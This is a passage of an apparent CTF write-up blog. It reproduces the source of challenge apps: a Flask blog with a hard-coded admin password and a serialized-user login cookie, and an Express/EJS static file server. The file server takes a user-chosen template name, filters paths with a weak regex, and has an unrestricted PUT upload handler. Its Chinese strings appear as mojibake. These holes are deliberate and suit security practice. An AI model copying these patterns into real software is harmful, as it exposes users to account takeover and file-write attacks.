keyword">if</span> db <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        db<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''            CREATE TABLE IF NOT EXISTS users (                id INTEGER PRIMARY KEY AUTOINCREMENT,                username TEXT UNIQUE NOT NULL,                password TEXT NOT NULL,                is_admin INTEGER NOT NULL DEFAULT 0            )        '''</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''            CREATE TABLE IF NOT EXISTS posts (                id INTEGER PRIMARY KEY AUTOINCREMENT,                title TEXT NOT NULL,                content TEXT NOT NULL,                created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP            )        '''</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM users WHERE username = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>                <span class="token string">'INSERT INTO users (username, password, is_admin) VALUES (?, ?, ?)'</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> generate_password_hash<span class="token punctuation">(</span><span class="token string">'aZPkAfnkXTm6UZKYPvhMWhRxnZENBRfB'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>            db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>                <span class="token string">'INSERT INTO users (username, password, is_admin) VALUES (?, ?, ?)'</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token string">'guest'</span><span class="token punctuation">,</span> generate_password_hash<span class="token punctuation">(</span><span class="token string">'guest'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>            db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">decorated_function</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        user <span class="token operator">=</span> get_current_user<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'è¯·å…ˆç™»å½•'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>is_admin<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'æ‚¨æ²¡æœ‰æƒé™æ‰§è¡Œæ­¤æ“ä½œï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    decorated_function<span class="token punctuation">.</span>__name__ <span class="token operator">=</span> f<span class="token punctuation">.</span>__name__    <span class="token keyword">return</span> decorated_function<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># ä»æ•°æ®åº“è·å–æ‰€æœ‰æ–‡ç« </span>    posts <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM posts ORDER BY created_at DESC'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> posts<span class="token operator">=</span>posts<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/add'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">add_post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span>        content <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> title <span class="token keyword">and</span> content<span class="token punctuation">:</span>            <span class="token comment"># å°†æ–‡ç« æ·»åŠ åˆ°æ•°æ®åº“</span>            db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token comment"># æŸ¥æ‰¾æœ€å°çš„å¯ç”¨IDï¼ˆå¡«è¡¥å·²åˆ é™¤çš„IDç©ºç¼ºï¼‰</span>            cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''                SELECT t1.id + 1 AS next_id                 FROM posts t1                 LEFT JOIN posts t2 ON t1.id + 1 = t2.id                 WHERE t2.id IS NULL                 ORDER BY t1.id                 LIMIT 1            '''</span><span class="token punctuation">)</span>            next_id <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token comment"># å¦‚æœæ²¡æœ‰ç©ºç¼ºçš„IDï¼Œä½¿ç”¨æœ€å¤§çš„ç°æœ‰ID+1</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> next_id<span class="token punctuation">:</span>                cursor <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT MAX(id) FROM posts'</span><span class="token punctuation">)</span>                max_id <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                next_id <span class="token operator">=</span> max_id <span class="token operator">+</span> <span class="token number">1</span> <span class="token keyword">if</span> max_id <span class="token keyword">else</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                next_id <span class="token operator">=</span> next_id<span class="token punctuation">[</span><span class="token string">'next_id'</span><span class="token punctuation">]</span>                        <span class="token comment"># ä½¿ç”¨æ‰¾åˆ°çš„IDæ’å…¥æ–°æ–‡ç« </span>            db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>                <span class="token string">'INSERT INTO posts (id, title, content) VALUES (?, ?, ?)'</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span>next_id<span class="token punctuation">,</span> title<span class="token punctuation">,</span> content<span class="token punctuation">)</span>            <span class="token punctuation">)</span>            db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'æ–‡ç« æ·»åŠ æˆåŠŸï¼'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'æ ‡é¢˜å’Œå†…å®¹ä¸èƒ½ä¸ºç©ºï¼'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'add_post.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/post/&lt;int:post_id>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view_post</span><span class="token punctuation">(</span>post_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    post <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM posts WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>post_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> post<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'view_post.html'</span><span class="token punctuation">,</span> post<span class="token operator">=</span>post<span class="token punctuation">,</span> post_id<span class="token operator">=</span>post_id<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'æ–‡ç« ä¸å­˜åœ¨ï¼'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>                db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM users WHERE username = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> user <span class="token keyword">and</span> check_password_hash<span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>            user_obj <span class="token operator">=</span> User<span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> user<span class="token punctuation">[</span><span class="token string">'is_admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>            user_hex <span class="token operator">=</span> user_obj<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span><span class="token punctuation">)</span>            response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'Token'</span><span class="token punctuation">,</span> user_hex<span class="token punctuation">,</span> max_age<span class="token operator">=</span><span class="token number">86400</span><span class="token punctuation">,</span> httponly<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> secure<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'ç™»å½•æˆåŠŸï¼'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> response        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'Token'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> expires<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    flash<span class="token punctuation">(</span><span class="token string">'å·²æˆåŠŸç™»å‡ºï¼'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/delete/&lt;int:post_id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">delete_post</span><span class="token punctuation">(</span>post_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    post <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT * FROM posts WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>post_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> post<span class="token punctuation">:</span>        db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'DELETE FROM posts WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>post_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'æ–‡ç« å·²æˆåŠŸåˆ é™¤ï¼'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'æ–‡ç« ä¸å­˜åœ¨ï¼'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    init_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="authwebï¼ˆUnsolvedï¼‰"><a href="#authwebï¼ˆUnsolvedï¼‰" class="headerlink" title="authwebï¼ˆUnsolvedï¼‰"></a>authwebï¼ˆUnsolvedï¼‰</h2><hr><h2 id="staticNodeServiceï¼ˆUnsolvedï¼‰"><a href="#staticNodeServiceï¼ˆUnsolvedï¼‰" class="headerlink" title="staticNodeServiceï¼ˆUnsolvedï¼‰"></a>staticNodeServiceï¼ˆUnsolvedï¼‰</h2><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token property">"ejs"</span><span class="token operator">:</span> <span class="token string">"^3.1.10"</span><span class="token punctuation">,</span>  <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.19.2"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>App.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">limit</span><span class="token operator">:</span> <span class="token string">'1mb'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">STATIC_DIR</span> <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// serve index for better viewing</span><span class="token keyword">function</span> <span class="token function">serveIndex</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> templ <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">||</span> <span class="token string">'index'</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> lsPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>templ<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">filenames</span><span class="token operator">:</span> fs<span class="token punctuation">.</span><span class="token function">readdirSync</span><span class="token punctuation">(</span>lsPath<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token literal-property property">path</span><span class="token operator">:</span> req<span class="token punctuation">.</span>path        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error rendering page'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// static serve for simply view/download</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token constant">STATIC_DIR</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Security middleware</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> req<span class="token punctuation">.</span>path <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>             <span class="token punctuation">(</span><span class="token keyword">typeof</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>templ <span class="token operator">!==</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error parsing path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">js$|\.\.</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Denied filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// logic middleware</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">serveIndex</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// Upload operation handler</span>app<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'/*'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">STATIC_DIR</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File already exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error writing file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">201</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File created/updated'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Server start</span>app<span class="token punctuation">.</span><span class="token 